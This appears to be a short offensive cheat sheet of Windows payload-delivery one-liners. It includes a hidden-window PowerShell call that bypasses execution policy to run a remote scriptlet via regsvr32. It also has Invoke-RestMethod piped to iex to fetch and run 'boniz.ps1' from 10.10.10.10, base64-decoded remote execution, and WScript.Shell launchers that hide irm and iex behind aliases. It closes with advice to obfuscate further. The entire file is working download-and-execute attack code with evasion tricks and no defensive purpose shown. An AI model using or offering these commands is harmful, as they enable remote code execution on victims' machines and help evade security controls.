# Init Via Regsvr32

# powershell.exe -ep Bypass -WindowStyle Hidden -Command 'regsvr32.exe /u /s /i:http://10.10.10.10:56000/.sct scrobj.dll'

# Without RegSvr32

Invoke-RestMethod -Uri 'http://10.10.10.10:8000/boniz.ps1' | iex

$response = irm http://127.0.0.1:55899; $x = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.message)); Write-Output $x| iex

# JScript
# var activeXObj = new ActiveXObject("WScript.Shell")
# var cmdToExec = "&{nEW-ALiAs -NamE mrii -ValUE 'IrM' -FoRcE; NeW-alIAs -naMe xeii -ValUE 'iEx' -FORce; & mrii -Uri http://10.10.10.10:8000/boniz.ps1 | & xeii}"
# var finalToExec = "powershell.exe -command \"" + cmdToExec +"\""
# activeXObj.Run(finalToExec);

# ----------------------------

$activeXObj = New-Object -ComObject WScript.Shell
$cmdToExec = "& { New-Alias -Name mrii -Value 'Invoke-RestMethod' -Force; New-Alias -Name xeii -Value 'iex' -Force; Invoke-RestMethod -Uri 'http://10.10.10.10:8000/boniz.ps1' | iex }"
$finalToExec = "powershell.exe -command ""$cmdToExec"""
$activeXObj.Run($finalToExec)

# Even better obfuscate the cmdToExec and also this script

Invoke-RestMethod -Uri 'http://10.10.10.10:8000/boniz.ps1' | iex




